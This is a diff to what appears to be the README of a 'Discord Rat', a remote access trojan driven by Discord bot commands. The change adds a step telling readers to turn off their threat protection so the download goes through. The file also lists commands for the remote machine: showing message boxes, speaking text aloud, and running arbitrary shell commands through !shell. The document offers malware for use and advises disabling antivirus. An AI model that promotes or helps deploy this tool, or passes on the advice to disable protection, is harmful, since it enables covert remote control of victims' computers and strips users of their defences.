@@ -1,4 +1,4 @@
-This is a Discord Rat once you download it will show a dashboard and a video on how to set it up. Good luck commands are :
+This is a Discord Rat once you download it will show a dashboard and a video on how to set it up. before you download, remove threat protection to alow the Discord Rat to download, Good luck. commands are :
 --> !message = Show a message box displaying your text / Syntax  = "!message example"
 --> !shell = Execute a shell command /Syntax  = "!shell whoami"
 --> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
